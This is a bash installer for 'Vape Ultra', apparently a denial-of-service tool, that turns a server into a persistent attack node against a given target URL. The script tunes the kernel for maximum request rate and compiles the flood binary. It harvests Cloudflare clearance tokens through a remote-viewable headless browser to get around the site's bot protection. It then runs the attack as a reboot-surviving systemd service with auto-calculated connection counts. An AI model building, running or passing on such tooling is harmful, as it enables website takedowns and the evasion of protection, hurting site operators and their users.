#!/usr/bin/env bash
# =============================================================================
#  Vape_setup.sh — Full Vape Ultra L7 Node Setup
#  Developer: @Paxjest  Engine: @Xstairs
#
#  Does everything in one run:
#    1. Installs all OS packages + build tools + libssl-dev
#    2. Applies maximum kernel / OS tuning for peak RPS
#    3. Compiles vape_ultra binary
#    4. Installs Python, Playwright, Chromium
#    5. Sets up Xvfb (virtual display) + x11vnc + noVNC as systemd services
#    6. Generates a VNC password and prints the browser URL
#    7. Launches l7_harvester.py inside the virtual display
#    8. Waits for you to connect via browser and solve the CF challenge
#    9. Auto-detects session.json, calculates max connections/threads
#   10. Launches vape_ultra at maximum performance and registers it as a
#       systemd service that survives reboots
#
#  Usage:
#    sudo bash Vape_setup.sh <target_url>
#    sudo bash Vape_setup.sh https://target.com
#    sudo bash Vape_setup.sh https://target.com --port 8443 --path /login
#    sudo bash Vape_setup.sh https://target.com --method l4   (skip harvest)
#
#  Flags:
#    --port   <n>     Override target port  (default: 443)
#    --path   <str>   Override target path  (default: /)
#    --method <m>     l4 | l4_lownet | l7 | l7_lownet  (default: l7)
#    --conns  <n>     Override connections  (default: auto from RAM)
#    --dur    <sec>   Attack duration in s  (default: 86400 = 24 h, restarts)
#    --vnc-port <n>   noVNC web port        (default: 6080)
#    --skip-compile   Skip recompiling if vape_ultra already exists
#    --skip-tune      Skip kernel tuning
# =============================================================================

set -euo pipefail

# ─── Colour helpers ───────────────────────────────────────────────────────────
RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'
CYN='\033[0;36m'; BLD='\033[1m'; RST='\033[0m'
log_info()  { echo -e "${CYN}[INFO]${RST}  $*"; }
log_ok()    { echo -e "${GRN}[  OK]${RST}  $*"; }
log_warn()  { echo -e "${YLW}[WARN]${RST}  $*"; }
log_err()   { echo -e "${RED}[ERR ]${RST}  $*" >&2; }
log_step()  { echo -e "\n${BLD}${YLW}══ $* ══${RST}"; }

# ─── Root check ───────────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    log_err "Run as root:  sudo bash Vape_setup.sh <target_url>"
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ─── Argument parsing ─────────────────────────────────────────────────────────
TARGET_URL=""
TARGET_PORT=443
TARGET_PATH="/"
ATTACK_METHOD="l7"
OVERRIDE_CONNS=0          # 0 = auto-calculate from RAM
ATTACK_DUR=86400          # 24 h, service restarts automatically
VNC_PORT=6080
SKIP_COMPILE=0
SKIP_TUNE=0

while [[ $# -gt 0 ]]; do
    case "$1" in
        http://*|https://*) TARGET_URL="$1"; shift ;;
        --port)    TARGET_PORT="$2";    shift 2 ;;
        --path)    TARGET_PATH="$2";    shift 2 ;;
        --method)  ATTACK_METHOD="$2";  shift 2 ;;
        --conns)   OVERRIDE_CONNS="$2"; shift 2 ;;
        --dur)     ATTACK_DUR="$2";     shift 2 ;;
        --vnc-port) VNC_PORT="$2";      shift 2 ;;
        --skip-compile) SKIP_COMPILE=1; shift ;;
        --skip-tune)    SKIP_TUNE=1;    shift ;;
        *)
            # bare domain without scheme
            if [[ "$1" != --* ]]; then TARGET_URL="https://$1"; fi
            shift
            ;;
    esac
done

# Prompt if no URL given
if [[ -z "$TARGET_URL" ]]; then
    echo -n "Enter target URL (e.g. https://target.com): "
    read -r TARGET_URL
    [[ "$TARGET_URL" != http* ]] && TARGET_URL="https://${TARGET_URL}"
fi

# Normalise: strip trailing slash, extract host
TARGET_URL="${TARGET_URL%/}"
TARGET_HOST=$(python3 -c "from urllib.parse import urlparse; u=urlparse('${TARGET_URL}'); print(u.hostname)" 2>/dev/null || echo "")
if [[ -z "$TARGET_HOST" ]]; then
    log_err "Cannot parse host from URL: $TARGET_URL"
    exit 1
fi

# ─── Paths ────────────────────────────────────────────────────────────────────
ULTRA_BIN="$SCRIPT_DIR/vape_ultra"
SESSION_JSON="$SCRIPT_DIR/session.json"
HARVESTER="$SCRIPT_DIR/l7_harvester.py"
VNC_PASS_FILE="/etc/vape/vncpasswd"
VAPE_CONF_DIR="/etc/vape"
ATTACK_WRAPPER="/usr/local/bin/vape-attack"
DISPLAY_NUM=99            # :99 — avoids conflicts

mkdir -p "$VAPE_CONF_DIR"

# ─── Banner ───────────────────────────────────────────────────────────────────
echo -e "${BLD}"
echo "  ╔══════════════════════════════════════════════════════╗"
echo "  ║          Vape Ultra v1.2 — Full Node Setup           ║"
echo "  ║          Developer: @Paxjest  Engine: @Xstairs       ║"
echo "  ╚══════════════════════════════════════════════════════╝"
echo -e "${RST}"
log_info "Target  : ${TARGET_URL}"
log_info "Method  : ${ATTACK_METHOD}"
log_info "noVNC   : port ${VNC_PORT}"
echo ""

###############################################################################
# STEP 1 — System packages
###############################################################################
log_step "1/8  Installing packages"
export DEBIAN_FRONTEND=noninteractive

if command -v apt-get &>/dev/null; then
    apt-get update -qq
    apt-get install -y -qq \
        build-essential g++ gcc make libssl-dev \
        python3 python3-pip python3-venv \
        xvfb x11vnc websockify \
        xfce4 xfce4-terminal dbus-x11 \
        wget curl git net-tools iproute2 \
        htop sysstat ethtool numactl cpufrequtils \
        libnss3 libatk1.0-0 libatk-bridge2.0-0 \
        libcups2 libxkbcommon0 libxcomposite1 \
        libxrandr2 libgbm1 libpango-1.0-0 \
        libcairo2 libasound2 2>/dev/null || true

    # noVNC web files
    if [[ ! -d /usr/share/novnc ]]; then
        apt-get install -y -qq novnc 2>/dev/null || \
        git clone --depth 1 https://github.com/novnc/noVNC.git /usr/share/novnc
    fi
elif command -v dnf &>/dev/null; then
    dnf install -y gcc-c++ openssl-devel python3 python3-pip \
        xorg-x11-server-Xvfb x11vnc git wget curl net-tools 2>/dev/null || true
elif command -v yum &>/dev/null; then
    yum install -y gcc-c++ openssl-devel python3 python3-pip \
        xorg-x11-server-Xvfb x11vnc git wget curl net-tools 2>/dev/null || true
fi
log_ok "Packages installed."

###############################################################################
# STEP 2 — OS Tuning (kernel params + limits)
###############################################################################
if [[ "$SKIP_TUNE" -eq 0 ]]; then
    log_step "2/8  Applying kernel & OS tuning for maximum RPS"

    # CPU governor
    for gov in /sys/devices/system/cpu/cpu[0-9]*/cpufreq/scaling_governor; do
        echo performance > "$gov" 2>/dev/null || true
    done
    for s in /sys/devices/system/cpu/cpu*/cpuidle/state[1-9]/disable; do
        echo 1 > "$s" 2>/dev/null || true
    done
    [[ -f /sys/devices/system/cpu/intel_pstate/no_turbo ]] && \
        echo 0 > /sys/devices/system/cpu/intel_pstate/no_turbo || true

    # Kernel network params
    sysctl -w kernel.numa_balancing=0                    >/dev/null
    sysctl -w net.ipv4.ip_local_port_range="1024 65535"  >/dev/null
    sysctl -w net.ipv4.tcp_tw_reuse=1                    >/dev/null
    sysctl -w net.ipv4.tcp_fin_timeout=3                 >/dev/null
    sysctl -w net.ipv4.tcp_max_tw_buckets=2000000        >/dev/null
    sysctl -w net.ipv4.tcp_synack_retries=1              >/dev/null
    sysctl -w net.ipv4.tcp_syn_retries=1                 >/dev/null
    sysctl -w net.ipv4.tcp_orphan_retries=1              >/dev/null
    sysctl -w net.ipv4.tcp_max_orphans=262144            >/dev/null
    sysctl -w net.ipv4.ip_nonlocal_bind=1                >/dev/null
    sysctl -w net.core.rmem_max=268435456                >/dev/null
    sysctl -w net.core.wmem_max=268435456                >/dev/null
    sysctl -w net.core.rmem_default=67108864             >/dev/null
    sysctl -w net.core.wmem_default=67108864             >/dev/null
    sysctl -w net.ipv4.tcp_rmem="4096 131072 268435456"  >/dev/null
    sysctl -w net.ipv4.tcp_wmem="4096 131072 268435456"  >/dev/null
    sysctl -w net.ipv4.tcp_mem="786432 2097152 33554432" >/dev/null
    sysctl -w net.ipv4.udp_mem="786432 2097152 33554432" >/dev/null
    sysctl -w net.core.somaxconn=262144                  >/dev/null
    sysctl -w net.ipv4.tcp_max_syn_backlog=262144        >/dev/null
    sysctl -w net.core.netdev_max_backlog=262144         >/dev/null
    sysctl -w net.core.netdev_budget=600                 >/dev/null
    sysctl -w net.core.netdev_budget_usecs=8000          >/dev/null
    sysctl -w net.ipv4.tcp_fastopen=3                    >/dev/null
    sysctl -w net.ipv4.tcp_keepalive_time=10             >/dev/null
    sysctl -w net.ipv4.tcp_keepalive_intvl=3             >/dev/null
    sysctl -w net.ipv4.tcp_keepalive_probes=3            >/dev/null
    sysctl -w net.ipv4.neigh.default.gc_thresh1=32768    >/dev/null
    sysctl -w net.ipv4.neigh.default.gc_thresh2=131072   >/dev/null
    sysctl -w net.ipv4.neigh.default.gc_thresh3=262144   >/dev/null
    sysctl -w net.core.optmem_max=25165824               >/dev/null
    sysctl -w net.core.busy_poll=50                      >/dev/null 2>&1 || true
    sysctl -w net.core.busy_read=50                      >/dev/null 2>&1 || true
    sysctl -w vm.swappiness=0                            >/dev/null
    sysctl -w vm.dirty_ratio=80                          >/dev/null
    sysctl -w vm.dirty_background_ratio=5                >/dev/null
    sysctl -w vm.overcommit_memory=1                     >/dev/null
    sysctl -w vm.max_map_count=1048576                   >/dev/null
    sysctl -w fs.file-max=26843545                       >/dev/null
    sysctl -w fs.nr_open=26843545                        >/dev/null

    # Persistent file-descriptor limits
    grep -v "# vape-tune" /etc/security/limits.conf > /tmp/_lim_tmp 2>/dev/null || true
    cp /tmp/_lim_tmp /etc/security/limits.conf
    cat >> /etc/security/limits.conf <<'LIMITS'
# vape-tune
*    soft nofile 1048576
*    hard nofile 1048576
root soft nofile 1048576
root hard nofile 1048576
*    soft nproc  1048576
*    hard nproc  1048576
LIMITS

    ulimit -n 1048576 2>/dev/null || true
    ulimit -u 1048576 2>/dev/null || true

    if command -v systemctl &>/dev/null; then
        mkdir -p /etc/systemd/system.conf.d
        cat > /etc/systemd/system.conf.d/vape.conf <<'SYSD'
[Manager]
DefaultLimitNOFILE=1048576
DefaultLimitNPROC=1048576
SYSD
    fi

    # NIC tuning
    for iface in $(ls /sys/class/net/ 2>/dev/null | grep -E '^(eth|ens|enp|eno)'); do
        ethtool -G "$iface" rx 4096 tx 4096 2>/dev/null || true
        ethtool -K "$iface" gro on gso on tso on 2>/dev/null || true
        ethtool -L "$iface" combined "$(nproc)" 2>/dev/null || true
    done

    log_ok "Kernel tuning applied."
else
    log_warn "Skipping kernel tuning (--skip-tune)"
fi

###############################################################################
# STEP 3 — Compile vape_ultra
###############################################################################
log_step "3/8  Compiling vape_ultra"

if [[ "$SKIP_COMPILE" -eq 1 && -x "$ULTRA_BIN" ]]; then
    log_warn "Skipping compile — using existing $ULTRA_BIN"
else
    if [[ ! -f "$SCRIPT_DIR/Vape_Ultra_1.2.cpp" ]]; then
        log_err "Vape_Ultra_1.2.cpp not found in $SCRIPT_DIR"
        exit 1
    fi

    log_info "Compiling with -O3 optimisations..."
    g++ -O3 -march=native -mtune=native \
        -funroll-loops -fno-plt          \
        -ffast-math -fomit-frame-pointer \
        -std=c++17                       \
        -o "$ULTRA_BIN"                  \
        "$SCRIPT_DIR/Vape_Ultra_1.2.cpp" \
        -lpthread -lssl -lcrypto

    strip "$ULTRA_BIN"
    log_ok "Compiled → $ULTRA_BIN  ($(du -sh "$ULTRA_BIN" | cut -f1))"
fi

###############################################################################
# STEP 4 — Auto-calculate maximum connection count
###############################################################################
log_step "4/8  Calculating optimal performance parameters"

CORES=$(nproc)
RAM_KB=$(grep MemTotal /proc/meminfo | awk '{print $2}')
RAM_MB=$((RAM_KB / 1024))

# Reserve 1.5 GB for OS + VNC + harvester overhead
USABLE_MB=$((RAM_MB - 1536))
[[ $USABLE_MB -lt 512 ]] && USABLE_MB=512

# Each L7 TLS connection uses ~32 KB (SSL ctx + epoll slot + send/recv buffers)
MAX_CONNS=$(( (USABLE_MB * 1024) / 32 ))

# Apply sensible caps
[[ $MAX_CONNS -gt 200000 ]] && MAX_CONNS=200000
[[ $MAX_CONNS -lt 5000  ]] && MAX_CONNS=5000

# Override if user passed --conns
[[ $OVERRIDE_CONNS -gt 0 ]] && MAX_CONNS=$OVERRIDE_CONNS

# Threads: one per logical CPU, minimum 2
MAX_THREADS=$CORES
[[ $MAX_THREADS -lt 2 ]] && MAX_THREADS=2

log_ok "RAM: ${RAM_MB} MB  |  CPUs: ${CORES}  |  Max connections: ${MAX_CONNS}  |  Threads: ${MAX_THREADS}"

###############################################################################
# STEP 5 — Install Python, Playwright, Chromium
###############################################################################
log_step "5/8  Installing Playwright & Chromium"

python3 -m pip install --quiet --upgrade --break-system-packages \
    --ignore-installed playwright flask 2>/dev/null || \
python3 -m pip install --quiet --upgrade playwright flask

log_info "Installing Chromium browser binaries (may take 1–3 minutes)..."
python3 -m playwright install chromium 2>/dev/null || true
python3 -m playwright install-deps chromium 2>/dev/null || true
log_ok "Playwright + Chromium ready."

###############################################################################
# STEP 6 — Generate VNC password + set up noVNC services
###############################################################################
log_step "6/8  Setting up virtual display + noVNC"

# Generate random 8-char VNC password and save for reference
VNC_PASS=$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 8)
echo "$VNC_PASS" > "$VAPE_CONF_DIR/vnc_password.txt"
chmod 600 "$VAPE_CONF_DIR/vnc_password.txt"

# Create x11vnc-compatible password file
x11vnc -storepasswd "$VNC_PASS" "$VNC_PASS_FILE" 2>/dev/null || {
    # fallback: write raw password file
    echo "$VNC_PASS" > "$VNC_PASS_FILE"
    chmod 600 "$VNC_PASS_FILE"
}

VNC_RFBPORT=5910   # internal VNC port (not exposed — only noVNC talks to it)
DBUS_LAUNCH_CMD=""
command -v dbus-launch &>/dev/null && DBUS_LAUNCH_CMD="dbus-launch --exit-with-session "

# ── Xvfb service ─────────────────────────────────────────────────────────────
cat > /etc/systemd/system/vape-xvfb.service <<UNIT
[Unit]
Description=Vape Virtual Display (Xvfb :${DISPLAY_NUM})
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/Xvfb :${DISPLAY_NUM} -screen 0 1280x800x24 -ac +extension GLX +render
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
UNIT

# ── x11vnc service ────────────────────────────────────────────────────────────
cat > /etc/systemd/system/vape-vnc.service <<UNIT
[Unit]
Description=Vape VNC Server (x11vnc on :${DISPLAY_NUM})
After=vape-xvfb.service
Requires=vape-xvfb.service

[Service]
Type=simple
Environment=DISPLAY=:${DISPLAY_NUM}
ExecStart=/usr/bin/x11vnc \
    -display :${DISPLAY_NUM} \
    -rfbport ${VNC_RFBPORT}  \
    -rfbauth ${VNC_PASS_FILE} \
    -listen 127.0.0.1        \
    -forever                 \
    -noxrecord               \
    -noxfixes                \
    -noxdamage               \
    -shared
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
UNIT

# ── noVNC / websockify service ────────────────────────────────────────────────
NOVNC_PATH=""
for p in /usr/share/novnc /usr/local/share/novnc /opt/novnc; do
    [[ -d "$p" ]] && { NOVNC_PATH="$p"; break; }
done
[[ -z "$NOVNC_PATH" ]] && NOVNC_PATH="/usr/share/novnc"

cat > /etc/systemd/system/vape-novnc.service <<UNIT
[Unit]
Description=Vape noVNC Web Interface (port ${VNC_PORT})
After=vape-vnc.service
Requires=vape-vnc.service

[Service]
Type=simple
ExecStart=/usr/bin/websockify \
    --web=${NOVNC_PATH}       \
    0.0.0.0:${VNC_PORT}       \
    127.0.0.1:${VNC_RFBPORT}
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
UNIT

# ── XFCE desktop (light session manager inside Xvfb) ─────────────────────────
cat > /etc/systemd/system/vape-desktop.service <<UNIT
[Unit]
Description=Vape XFCE Desktop Session
After=vape-xvfb.service
Requires=vape-xvfb.service

[Service]
Type=simple
Environment=DISPLAY=:${DISPLAY_NUM}
Environment=HOME=/root
ExecStart=${DBUS_LAUNCH_CMD}startxfce4
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
systemctl enable --quiet vape-xvfb vape-vnc vape-novnc vape-desktop
systemctl restart vape-xvfb
sleep 2
systemctl restart vape-desktop vape-vnc
sleep 2
systemctl restart vape-novnc
sleep 1

log_ok "Virtual display + noVNC started."

###############################################################################
# STEP 7 — Launch l7_harvester inside the virtual display
###############################################################################
log_step "7/8  Starting CF session harvester"

HARVESTER_LOG="$VAPE_CONF_DIR/harvester.log"

# Build harvester args
HARVESTER_ARGS="$TARGET_URL --session $SESSION_JSON"
[[ "$TARGET_PORT" != "443" && "$TARGET_PORT" != "80" ]] && \
    HARVESTER_ARGS="$HARVESTER_ARGS --port $TARGET_PORT"
[[ "$TARGET_PATH" != "/" ]] && \
    HARVESTER_ARGS="$HARVESTER_ARGS --path $TARGET_PATH"

# Write harvester systemd service
cat > /etc/systemd/system/vape-harvester.service <<UNIT
[Unit]
Description=Vape L7 CF Session Harvester
After=vape-desktop.service
Requires=vape-xvfb.service

[Service]
Type=simple
Environment=DISPLAY=:${DISPLAY_NUM}
Environment=HOME=/root
WorkingDirectory=${SCRIPT_DIR}
ExecStart=python3 ${HARVESTER} ${HARVESTER_ARGS}
Restart=on-failure
RestartSec=30
StandardOutput=append:${HARVESTER_LOG}
StandardError=append:${HARVESTER_LOG}

[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
systemctl enable --quiet vape-harvester
systemctl restart vape-harvester

log_ok "Harvester started inside virtual display."

###############################################################################
# STEP 8 — Print connection info and wait for session.json
###############################################################################
log_step "8/8  Waiting for CF session — connect via browser now"

# Get public IP
PUB_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || \
         curl -s --max-time 5 api.ipify.org 2>/dev/null || \
         hostname -I | awk '{print $1}')

echo ""
echo -e "${BLD}${GRN}╔══════════════════════════════════════════════════════════╗${RST}"
echo -e "${BLD}${GRN}║           CONNECT TO VIRTUAL BROWSER NOW                 ║${RST}"
echo -e "${BLD}${GRN}╠══════════════════════════════════════════════════════════╣${RST}"
echo -e "${BLD}${GRN}║${RST}  Browser URL : ${BLD}http://${PUB_IP}:${VNC_PORT}/vnc.html${RST}"
echo -e "${BLD}${GRN}║${RST}  VNC Password: ${BLD}${VNC_PASS}${RST}"
echo -e "${BLD}${GRN}║${RST}  Target      : ${BLD}${TARGET_URL}${RST}"
echo -e "${BLD}${GRN}╠══════════════════════════════════════════════════════════╣${RST}"
echo -e "${BLD}${GRN}║${RST}  Steps:                                                  "
echo -e "${BLD}${GRN}║${RST}  1. Open the URL above in your browser                   "
echo -e "${BLD}${GRN}║${RST}  2. Click Connect, enter the VNC password                "
echo -e "${BLD}${GRN}║${RST}  3. You will see Chrome open with ${TARGET_HOST}          "
echo -e "${BLD}${GRN}║${RST}  4. If a Cloudflare challenge appears — solve it          "
echo -e "${BLD}${GRN}║${RST}  5. This script auto-detects the token and launches       "
echo -e "${BLD}${GRN}║${RST}     vape_ultra automatically — no further action needed   "
echo -e "${BLD}${GRN}╚══════════════════════════════════════════════════════════╝${RST}"
echo ""
log_warn "Firewall: ensure port ${VNC_PORT} is open for YOUR IP only. Close it after harvest."
echo ""

# ─── Poll for valid session.json ──────────────────────────────────────────────
SESSION_TIMEOUT=600    # wait up to 10 minutes for user to solve challenge
SESSION_POLL=3
ELAPSED=0
DOTS=0

log_info "Waiting for session.json (up to ${SESSION_TIMEOUT}s)..."

while true; do
    if [[ -f "$SESSION_JSON" ]]; then
        # Validate: check valid_until field
        VALID_UNTIL=$(python3 -c "
import json, time, sys
try:
    d = json.load(open('$SESSION_JSON'))
    vu = int(d.get('valid_until', 0))
    host = d.get('host', '')
    cf = d.get('cf_clearance', '')
    # Accept if valid_until is in the future and host matches target
    if vu > time.time() and cf:
        print('VALID')
    else:
        print('STALE')
except Exception as e:
    print('ERR:' + str(e))
" 2>/dev/null)

        if [[ "$VALID_UNTIL" == "VALID" ]]; then
            log_ok "session.json captured and validated!"
            break
        elif [[ "$VALID_UNTIL" == STALE* ]]; then
            log_warn "session.json found but token is stale — waiting for harvester to refresh..."
        fi
    fi

    if [[ $ELAPSED -ge $SESSION_TIMEOUT ]]; then
        log_err "Timed out waiting for session.json after ${SESSION_TIMEOUT}s."
        log_warn "You can still start the attack manually once you have a session:"
        echo "  $ULTRA_BIN $TARGET_HOST $TARGET_PORT $ATTACK_METHOD $MAX_CONNS $MAX_THREADS $ATTACK_DUR $SESSION_JSON"
        log_info "Harvester logs: tail -f $HARVESTER_LOG"
        exit 1
    fi

    # Animated wait indicator
    DOTS=$(( (DOTS + 1) % 4 ))
    DOT_STR=$(printf '%0.s.' $(seq 1 $((DOTS + 1))))
    printf "\r  ${CYN}Waiting${RST} %${#DOT_STR}s ${DOT_STR}  ${ELAPSED}s elapsed   " "$DOT_STR"

    sleep $SESSION_POLL
    ELAPSED=$((ELAPSED + SESSION_POLL))
done
echo ""

###############################################################################
# Launch vape_ultra at maximum performance
###############################################################################

# Read actual host/port from session.json (may differ from URL if harvester resolved)
SESSION_HOST=$(python3 -c "
import json
d = json.load(open('$SESSION_JSON'))
print(d.get('host', '$TARGET_HOST'))
" 2>/dev/null || echo "$TARGET_HOST")

SESSION_PORT=$(python3 -c "
import json
d = json.load(open('$SESSION_JSON'))
print(d.get('port', $TARGET_PORT))
" 2>/dev/null || echo "$TARGET_PORT")

echo ""
echo -e "${BLD}${YLW}══ Launching vape_ultra at MAXIMUM settings ══${RST}"
log_info "Host       : $SESSION_HOST"
log_info "Port       : $SESSION_PORT"
log_info "Method     : $ATTACK_METHOD"
log_info "Connections: $MAX_CONNS"
log_info "Threads    : $MAX_THREADS (pinned to CPU cores)"
log_info "Duration   : ${ATTACK_DUR}s per cycle (service auto-restarts)"
log_info "Session    : $SESSION_JSON"
echo ""

# ── Write attack wrapper script (restarts automatically) ─────────────────────
cat > "$ATTACK_WRAPPER" <<WRAPPER
#!/usr/bin/env bash
# Vape Ultra attack wrapper — auto-restarts, waits for valid session
set -euo pipefail
SESSION_JSON="${SESSION_JSON}"
ULTRA_BIN="${ULTRA_BIN}"
ATTACK_LOG="${VAPE_CONF_DIR}/attack.log"

while true; do
    # Wait for valid session before each cycle
    for i in \$(seq 1 60); do
        if python3 -c "
import json,time,sys
try:
    d=json.load(open('\$SESSION_JSON'))
    sys.exit(0 if d.get('cf_clearance','') and int(d.get('valid_until',0))>time.time()+60 else 1)
except:
    sys.exit(1)
" 2>/dev/null; then
            break
        fi
        echo "[\$(date +%T)] Waiting for valid session..." >> "\$ATTACK_LOG"
        sleep 10
    done

    echo "[\$(date +%T)] Starting attack cycle..." >> "\$ATTACK_LOG"
    "\$ULTRA_BIN" \\
        "${SESSION_HOST}" \\
        "${SESSION_PORT}" \\
        "${ATTACK_METHOD}" \\
        "${MAX_CONNS}"    \\
        "${MAX_THREADS}"  \\
        "${ATTACK_DUR}"   \\
        "\$SESSION_JSON"  >> "\$ATTACK_LOG" 2>&1 || true

    echo "[\$(date +%T)] Cycle ended — restarting..." >> "\$ATTACK_LOG"
    sleep 2
done
WRAPPER

chmod +x "$ATTACK_WRAPPER"

# ── Attack systemd service (survives reboots) ─────────────────────────────────
cat > /etc/systemd/system/vape-attack.service <<UNIT
[Unit]
Description=Vape Ultra Attack Engine
After=network.target vape-harvester.service

[Service]
Type=simple
WorkingDirectory=${SCRIPT_DIR}
ExecStart=${ATTACK_WRAPPER}
Restart=always
RestartSec=5
LimitNOFILE=1048576
LimitNPROC=1048576
OOMScoreAdjust=-900

[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
systemctl enable --quiet vape-attack
systemctl restart vape-attack

sleep 2
ATTACK_STATUS=$(systemctl is-active vape-attack 2>/dev/null || echo "failed")

###############################################################################
# Done — final summary
###############################################################################
echo ""
echo -e "${BLD}${GRN}╔══════════════════════════════════════════════════════════╗${RST}"
echo -e "${BLD}${GRN}║                  SETUP COMPLETE                          ║${RST}"
echo -e "${BLD}${GRN}╠══════════════════════════════════════════════════════════╣${RST}"
echo -e "${BLD}${GRN}║${RST}  Attack status : ${BLD}${ATTACK_STATUS}${RST}"
echo -e "${BLD}${GRN}║${RST}  Target        : ${BLD}${SESSION_HOST}:${SESSION_PORT}${RST}"
echo -e "${BLD}${GRN}║${RST}  Method        : ${BLD}${ATTACK_METHOD}${RST}"
echo -e "${BLD}${GRN}║${RST}  Connections   : ${BLD}${MAX_CONNS}${RST}"
echo -e "${BLD}${GRN}║${RST}  Threads       : ${BLD}${MAX_THREADS}${RST}"
echo -e "${BLD}${GRN}║${RST}  RAM           : ${BLD}${RAM_MB} MB${RST}"
echo -e "${BLD}${GRN}║${RST}  CPUs          : ${BLD}${CORES}${RST}"
echo -e "${BLD}${GRN}╠══════════════════════════════════════════════════════════╣${RST}"
echo -e "${BLD}${GRN}║${RST}  noVNC         : ${BLD}http://${PUB_IP}:${VNC_PORT}/vnc.html${RST}"
echo -e "${BLD}${GRN}║${RST}  VNC Password  : ${BLD}${VNC_PASS}${RST}  (saved: ${VAPE_CONF_DIR}/vnc_password.txt)"
echo -e "${BLD}${GRN}╠══════════════════════════════════════════════════════════╣${RST}"
echo -e "${BLD}${GRN}║${RST}  Useful commands:                                        "
echo -e "${BLD}${GRN}║${RST}    Live attack log : tail -f ${VAPE_CONF_DIR}/attack.log    "
echo -e "${BLD}${GRN}║${RST}    Harvester log   : tail -f ${VAPE_CONF_DIR}/harvester.log "
echo -e "${BLD}${GRN}║${RST}    Attack status   : systemctl status vape-attack          "
echo -e "${BLD}${GRN}║${RST}    Stop attack     : systemctl stop vape-attack            "
echo -e "${BLD}${GRN}║${RST}    Restart attack  : systemctl restart vape-attack         "
echo -e "${BLD}${GRN}║${RST}    Stop everything : systemctl stop vape-attack            "
echo -e "${BLD}${GRN}║${RST}                       systemctl stop vape-harvester        "
echo -e "${BLD}${GRN}║${RST}    New session     : systemctl restart vape-harvester      "
echo -e "${BLD}${GRN}╚══════════════════════════════════════════════════════════╝${RST}"
echo ""
log_warn "Session expires every ~30 min. Harvester auto-refreshes it silently."
log_warn "If Cloudflare shows a new challenge, open noVNC and solve it again."
log_warn "Close port ${VNC_PORT} in your firewall when not actively harvesting."
echo ""
